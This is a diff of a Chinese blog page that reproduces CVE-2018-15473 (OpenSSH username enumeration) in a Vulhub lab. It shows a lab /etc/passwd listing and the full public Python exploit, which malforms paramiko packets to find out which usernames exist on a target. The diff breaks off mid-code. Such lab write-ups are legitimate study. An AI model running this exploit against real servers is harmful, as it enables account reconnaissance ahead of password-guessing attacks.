@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE, Jlan&#39;s Little World">
+    <meta name="keywords" content="CVE, J1an&#39;s Little World">
     <meta name="description" content="CVE在Vulhub上面的CVE复现，一份小记录
 OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，可以判断某个用户名是否存在于目标主机中
 漏洞作用：我们用弱口令、爆破等方式进">
@@ -19,7 +19,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CVE | Jlan&#39;s Little World</title>
+    <title>CVE | J1an&#39;s Little World</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -47,8 +47,6 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 
 
     
-        <link rel="stylesheet" type="text/css" href="/css/reward.css">
-    
 
 
 
@@ -66,7 +64,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Jlan&#39;s Little World</span>
+                    <span class="logo-span">J1an&#39;s Little World</span>
                 </a>
             </div>
             
@@ -87,55 +85,11 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/archives" class="waves-effect waves-light">
       
       <i class="fas fa-archive" style="zoom: 0.6;"></i>
       
       <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
     </a>
     
   </li>
@@ -170,7 +124,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Jlan&#39;s Little World</div>
+        <div class="logo-name">J1an&#39;s Little World</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -193,55 +147,11 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
         
         <li class="m-nav-item">
 	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
 		<a href="/archives" class="waves-effect waves-light">
 			
 			    <i class="fa-fw fas fa-archive"></i>
 			
 			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -393,6 +303,9 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
 
         
 
@@ -407,12 +320,271 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 <li><p>进入docker更改密码，此处改为<code>123456</code></p>
 </li>
 <li><p>ssh连接docker，查看<code>/etc/passwd</code>文件来查看用户名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/bin/false</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/usr/local/sbin/sshd:/sbin/nologin</span><br><span class="line">vulhub:x:1000:1000:,,,:/home/vulhub:/bin/bash</span><br><span class="line">example:x:1001:1001:,,,:/home/example:/bin/bash</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-none"><code class="language-none">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
+sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
+games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
+man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
+lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
+news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
+uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
+proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
+backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
+list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
+irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
+nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
+_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false
+sshd:x:74:74:Privilege-separated SSH:&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;sshd:&#x2F;sbin&#x2F;nologin
+vulhub:x:1000:1000:,,,:&#x2F;home&#x2F;vulhub:&#x2F;bin&#x2F;bash
+example:x:1001:1001:,,,:&#x2F;home&#x2F;example:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>测试exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># python2 exp.py --port SSH端口 --userList 用户名字典 IP</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"><span class="comment">#                ____                    _____ _____ _    _               #</span></span><br><span class="line"><span class="comment">#               / __ \                  / ____/ ____| |  | |              #</span></span><br><span class="line"><span class="comment">#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #</span></span><br><span class="line"><span class="comment">#              | |  | | &#x27;_ \ / _ \ &#x27;_ \ \___ \\___ \|  __  |              #</span></span><br><span class="line"><span class="comment">#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #</span></span><br><span class="line"><span class="comment">#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #</span></span><br><span class="line"><span class="comment">#                     | |               Username Enumeration              #</span></span><br><span class="line"><span class="comment">#                     |_|                                                 #</span></span><br><span class="line"><span class="comment">#                                                                         #</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"><span class="comment"># Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #</span></span><br><span class="line"><span class="comment"># Vulnerability: CVE-2018-15473                                           #</span></span><br><span class="line"><span class="comment"># Affected Versions: OpenSSH version &lt; 7.7                                #</span></span><br><span class="line"><span class="comment"># Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #</span></span><br><span class="line"><span class="comment"># Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #</span></span><br><span class="line"><span class="comment"># Email: Justin.Gardner@SynerComm.com                                     #</span></span><br><span class="line"><span class="comment"># Date: August 20, 2018                                                   #</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint <span class="keyword">as</span> rand</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice <span class="keyword">as</span> choice</span><br><span class="line"><span class="comment"># store function we will overwrite to malform the packet</span></span><br><span class="line">old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="comment"># list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target</span></span><br><span class="line"><span class="comment"># with these 3 random usernames (there is an almost 0 possibility that they can be real ones)</span></span><br><span class="line">random_username_list = []</span><br><span class="line"><span class="comment"># populate the list</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    user = <span class="string">&quot;&quot;</span>.join(choice(string.ascii_lowercase) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(rand(<span class="number">15</span>, <span class="number">20</span>)))</span><br><span class="line">    random_username_list.append(user)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create custom exception</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadUsername</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create malicious &quot;add_boolean&quot; function to malform packet</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create function to call when username was invalid</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_error</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">raise</span> BadUsername()</span><br><span class="line"></span><br><span class="line"><span class="comment"># create the malicious function to overwrite MSG_SERVICE_ACCEPT handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malform_packet</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">    old_add_boolean = paramiko.message.Message.add_boolean</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    result  = old_parse_service_accept(*args, **kwargs)</span><br><span class="line">    <span class="comment">#return old add_boolean function so start_client will work again</span></span><br><span class="line">    paramiko.message.Message.add_boolean = old_add_boolean</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># create function to perform authentication with malformed packet and desired username</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkUsername</span>(<span class="params">username, tried=<span class="number">0</span></span>):</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line">    <span class="comment"># instantiate transport</span></span><br><span class="line">    transport = paramiko.transport.Transport(sock)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        transport.start_client()</span><br><span class="line">    <span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">        <span class="comment"># server was likely flooded, retry up to 3 times</span></span><br><span class="line">        transport.close()</span><br><span class="line">        <span class="keyword">if</span> tried &lt; <span class="number">4</span>:</span><br><span class="line">            tried += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> checkUsername(username, tried)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        transport.auth_publickey(username, paramiko.RSAKey.generate(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">except</span> BadUsername:</span><br><span class="line">            <span class="keyword">return</span> (username, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">            <span class="keyword">return</span> (username, <span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#Successful auth(?)</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;There was an error. Is this the correct version of OpenSSH?&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># function to test target system using the randomly generated usernames</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulnerable</span>():</span></span><br><span class="line">    vulnerable = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> random_username_list:</span><br><span class="line">        result = checkUsername(user)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>]:</span><br><span class="line">            vulnerable = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> vulnerable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exportJSON</span>(<span class="params">results</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;Valid&quot;</span>:[], <span class="string">&quot;Invalid&quot;</span>:[]&#125;</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>] <span class="keyword">and</span> result[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="string">&#x27;Valid&#x27;</span>]:</span><br><span class="line">            data[<span class="string">&#x27;Valid&#x27;</span>].append(result[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> result[<span class="number">1</span>] <span class="keyword">and</span> result[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="string">&#x27;Invalid&#x27;</span>]:</span><br><span class="line">            data[<span class="string">&#x27;Invalid&#x27;</span>].append(result[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exportCSV</span>(<span class="params">results</span>):</span></span><br><span class="line">    final = <span class="string">&quot;Username, Valid\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        final += result[<span class="number">0</span>]+<span class="string">&quot;, &quot;</span>+<span class="built_in">str</span>(result[<span class="number">1</span>])+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exportList</span>(<span class="params">results</span>):</span></span><br><span class="line">    final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>]:</span><br><span class="line">            final+=result[<span class="number">0</span>]+<span class="string">&quot; is a valid user!\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            final+=result[<span class="number">0</span>]+<span class="string">&quot; is not a valid user!\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="comment"># assign functions to respective handlers</span></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet</span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error</span><br><span class="line"></span><br><span class="line"><span class="comment"># get rid of paramiko logging</span></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;The target hostname or ip address&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">22</span>, <span class="built_in">help</span>=<span class="string">&quot;The target port&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--threads&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>, <span class="built_in">help</span>=<span class="string">&quot;The number of threads to be used&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--outputFile&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;The output file location&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--outputFormat&#x27;</span>, choices=[<span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>], default=<span class="string">&#x27;list&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;The output file location&quot;</span>)</span><br><span class="line">group = arg_parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">group.add_argument(<span class="string">&#x27;--username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;The single username to validate&quot;</span>)</span><br><span class="line">group.add_argument(<span class="string">&#x27;--userList&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;The list of usernames (one per line) to enumerate through&quot;</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect((args.hostname, args.port))</span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span> socket.error:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Connecting to host failed. Please check the specified host and port.&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># first we run the function to check if host is vulnerable to this CVE</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> checkVulnerable():</span><br><span class="line">        <span class="comment"># most probably the target host is either patched or running a version not affected by this CVE</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Target host most probably is not vulnerable or already patched, exiting...&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> args.username: <span class="comment">#single username passed in</span></span><br><span class="line">        result = checkUsername(args.username)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>]+<span class="string">&quot; is a valid user!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>]+<span class="string">&quot; is not a valid user!&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> args.userList: <span class="comment">#username list passed in</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(args.userList)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] File doesn&#x27;t exist or is unreadable.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">3</span>)</span><br><span class="line">        usernames = <span class="built_in">map</span>(<span class="built_in">str</span>.strip, f.readlines())</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># map usernames to their respective threads</span></span><br><span class="line">        pool = multiprocessing.Pool(args.threads)</span><br><span class="line">        results = pool.<span class="built_in">map</span>(checkUsername, usernames)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile = <span class="built_in">open</span>(args.outputFile, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot write to outputFile.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> args.outputFormat==<span class="string">&#x27;json&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile.writelines(exportJSON(results))</span><br><span class="line">                outputFile.close()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] Results successfully written to &quot;</span> + args.outputFile + <span class="string">&quot; in JSON form.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(exportJSON(results))</span><br><span class="line">        <span class="keyword">elif</span> args.outputFormat==<span class="string">&#x27;csv&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile.writelines(exportCSV(results))</span><br><span class="line">                outputFile.close()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] Results successfully written to &quot;</span> + args.outputFile + <span class="string">&quot; in CSV form.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(exportCSV(results))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile.writelines(exportList(results))</span><br><span class="line">                outputFile.close()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] Results successfully written to &quot;</span> + args.outputFile + <span class="string">&quot; in List form.&quot;</span>)</span><br><span 